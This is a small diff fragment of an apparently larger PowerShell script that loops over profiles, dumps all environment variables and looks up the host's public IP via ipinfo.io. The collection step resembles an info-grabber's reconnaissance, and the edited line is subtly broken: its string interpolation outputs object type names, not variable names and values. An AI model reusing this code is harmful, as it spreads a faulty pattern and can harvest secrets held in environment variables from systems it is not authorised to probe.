@@ -13,7 +13,7 @@ foreach ($profile in $profiles) {
 }
 
 $envVars = gci env: | ForEach-Object {
-    $_.Name $_.Value
+    "$_.Name = $_.Value"
 }
 
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
